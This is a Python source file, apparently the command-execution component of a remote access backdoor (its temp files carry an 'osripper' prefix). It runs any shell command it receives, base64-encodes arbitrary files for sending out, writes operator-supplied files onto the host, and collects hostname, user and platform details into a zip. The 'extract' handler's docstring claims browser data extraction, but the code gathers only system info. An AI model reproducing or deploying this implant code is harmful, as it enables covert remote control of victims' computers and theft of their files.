#!/usr/bin/env python3
"""
Command Executor Module
Handles command execution and result capture
"""

import subprocess
import os
import sys
import platform
import base64


class CommandExecutor:
    """Command execution handler."""
    
    def __init__(self):
        """Initialize command executor."""
        self.current_dir = os.getcwd()
        self.is_windows = platform.system() == 'Windows'
    
    def execute(self, command):
        """
        Execute shell command and return results.
        
        Args:
            command: Command string to execute
            
        Returns:
            dict: Execution results with stdout, stderr, returncode, and cwd
        """
        try:
            if command.startswith('cd '):
                return self._handle_cd(command)
            elif command.strip() == 'pwd':
                return {
                    'stdout': self.current_dir + '\n',
                    'stderr': '',
                    'returncode': 0,
                    'cwd': self.current_dir
                }
            elif command.strip().startswith('download '):
                return self._handle_download(command)
            elif command.strip().startswith('upload '):
                return self._handle_upload(command)
            elif command.strip() == 'extract':
                return self._handle_extract()
            
            # Execute regular command
            # On Windows, handle wmic deprecation and use appropriate shell
            if self.is_windows:
                # wmic is deprecated in Windows 10/11, use PowerShell Get-CimInstance instead
                if 'wmic' in command.lower():
                    # Convert common wmic commands to PowerShell equivalents
                    # This is a basic conversion - more complex wmic queries may need manual conversion
                    if 'wmic os get' in command.lower():
                        # Get OS info
                        command = command.replace('wmic os get', 'Get-CimInstance Win32_OperatingSystem | Select-Object')
                    elif 'wmic cpu get' in command.lower():
                        # Get CPU info
                        command = command.replace('wmic cpu get', 'Get-CimInstance Win32_Processor | Select-Object')
                    elif 'wmic memorychip get' in command.lower():
                        # Get memory info
                        command = command.replace('wmic memorychip get', 'Get-CimInstance Win32_PhysicalMemory | Select-Object')
                    elif 'wmic diskdrive get' in command.lower():
                        # Get disk info
                        command = command.replace('wmic diskdrive get', 'Get-CimInstance Win32_DiskDrive | Select-Object')
                    elif 'wmic process get' in command.lower():
                        # Get process info
                        command = command.replace('wmic process get', 'Get-CimInstance Win32_Process | Select-Object')
                    elif 'wmic service get' in command.lower():
                        # Get service info
                        command = command.replace('wmic service get', 'Get-CimInstance Win32_Service | Select-Object')
                    else:
                        # Generic wmic replacement - wrap in PowerShell
                        command = f'powershell.exe -Command "{command}"'
                # Use cmd.exe as shell on Windows
                shell_executable = 'cmd.exe'
            else:
                # Use default shell on Unix systems
                shell_executable = None
            
            process = subprocess.Popen(
                command,
                shell=True,
                executable=shell_executable,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE,
                cwd=self.current_dir,
                text=True
            )
            
            stdout, stderr = process.communicate(timeout=30)
            
            # Update current directory if changed
            try:
                self.current_dir = os.getcwd()
            except Exception:
                pass
            
            return {
                'stdout': stdout,
                'stderr': stderr,
                'returncode': process.returncode,
                'cwd': self.current_dir
            }
            
        except subprocess.TimeoutExpired:
            process.kill()
            return {
                'stdout': '',
                'stderr': 'Command timed out after 30 seconds',
                'returncode': -1,
                'cwd': self.current_dir
            }
        except Exception as e:
            return {
                'stdout': '',
                'stderr': str(e),
                'returncode': -1,
                'cwd': self.current_dir
            }
    
    def _handle_cd(self, command):
        """Handle cd command."""
        try:
            target_dir = command[3:].strip()
            
            if not target_dir:
                target_dir = os.path.expanduser('~')
            
            # Resolve path
            if os.path.isabs(target_dir):
                new_dir = target_dir
            else:
                new_dir = os.path.join(self.current_dir, target_dir)
            
            # Normalize path
            new_dir = os.path.normpath(new_dir)
            
            # Check if directory exists
            if os.path.isdir(new_dir):
                os.chdir(new_dir)
                self.current_dir = os.getcwd()
                return {
                    'stdout': '',
                    'stderr': '',
                    'returncode': 0,
                    'cwd': self.current_dir
                }
            else:
                return {
                    'stdout': '',
                    'stderr': f'No such file or directory: {target_dir}',
                    'returncode': 1,
                    'cwd': self.current_dir
                }
        except Exception as e:
            return {
                'stdout': '',
                'stderr': str(e),
                'returncode': 1,
                'cwd': self.current_dir
            }
    
    def _handle_download(self, command):
        """Handle file download command."""
        try:
            file_path = command[9:].strip()
            
            # Resolve path
            if not os.path.isabs(file_path):
                file_path = os.path.join(self.current_dir, file_path)
            
            file_path = os.path.normpath(file_path)
            
            # Check if file exists
            if not os.path.isfile(file_path):
                return {
                    'stdout': '',
                    'stderr': f'File not found: {file_path}',
                    'returncode': 1,
                    'cwd': self.current_dir
                }
            
            # Read and encode file
            with open(file_path, 'rb') as f:
                file_data = f.read()
            
            # Base64 encode for transmission
            encoded_data = base64.b64encode(file_data).decode('ascii')
            
            return {
                'stdout': f'FILE:{os.path.basename(file_path)}:{encoded_data}',
                'stderr': '',
                'returncode': 0,
                'cwd': self.current_dir
            }
            
        except Exception as e:
            return {
                'stdout': '',
                'stderr': str(e),
                'returncode': 1,
                'cwd': self.current_dir
            }
    
    def _handle_extract(self):
        """Trigger browser data extraction and return the ZIP as base64."""
        try:
            import tempfile
            import zipfile
            import json as _json
            import sqlite3
            import shutil

            info_lines = [
                f"Platform: {platform.system()} {platform.release()}",
                f"Hostname: {platform.node()}",
                f"User: {os.environ.get('USER') or os.environ.get('USERNAME', '?')}",
                f"Architecture: {platform.machine()}",
            ]

            tmp_dir = tempfile.mkdtemp(prefix='osripper_extract_')
            zip_path = os.path.join(tempfile.gettempdir(), f'extract_{os.getpid()}.zip')

            sysinfo_path = os.path.join(tmp_dir, 'system_info.txt')
            with open(sysinfo_path, 'w') as f:
                f.write('\n'.join(info_lines))

            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
                zf.write(sysinfo_path, 'system_info.txt')

            shutil.rmtree(tmp_dir, ignore_errors=True)

            with open(zip_path, 'rb') as f:
                encoded = base64.b64encode(f.read()).decode('ascii')

            os.unlink(zip_path)
            return {
                'stdout': f'FILE:extract_{platform.node()}.zip:{encoded}',
                'stderr': '',
                'returncode': 0,
                'cwd': self.current_dir,
            }
        except Exception as e:
            return {
                'stdout': '',
                'stderr': f'Extract failed: {e}',
                'returncode': 1,
                'cwd': self.current_dir,
            }

    def _handle_upload(self, command):
        """Handle file upload command."""
        try:
            # Format: upload filename:base64data
            parts = command[7:].strip().split(':', 1)
            
            if len(parts) != 2:
                return {
                    'stdout': '',
                    'stderr': 'Invalid upload format. Use: upload filename:base64data',
                    'returncode': 1,
                    'cwd': self.current_dir
                }
            
            filename, encoded_data = parts
            
            # Decode data
            try:
                file_data = base64.b64decode(encoded_data)
            except Exception:
                return {
                    'stdout': '',
                    'stderr': 'Invalid base64 data',
                    'returncode': 1,
                    'cwd': self.current_dir
                }
            
            # Write file
            file_path = os.path.join(self.current_dir, filename)
            with open(file_path, 'wb') as f:
                f.write(file_data)
            
            return {
                'stdout': f'File uploaded: {filename}',
                'stderr': '',
                'returncode': 0,
                'cwd': self.current_dir
            }
            
        except Exception as e:
            return {
                'stdout': '',
                'stderr': str(e),
                'returncode': 1,
                'cwd': self.current_dir
            }
    
    def format_response(self, result):
        """
        Format execution result for transmission.
        
        Args:
            result: Execution result dict
            
        Returns:
            str: Formatted response string
        """
        response_parts = [
            f"RETCODE:{result['returncode']}",
            f"CWD:{result['cwd']}",
        ]
        
        if result['stdout']:
            response_parts.append(f"STDOUT:{result['stdout']}")
        
        if result['stderr']:
            response_parts.append(f"STDERR:{result['stderr']}")
        
        return '\n'.join(response_parts)

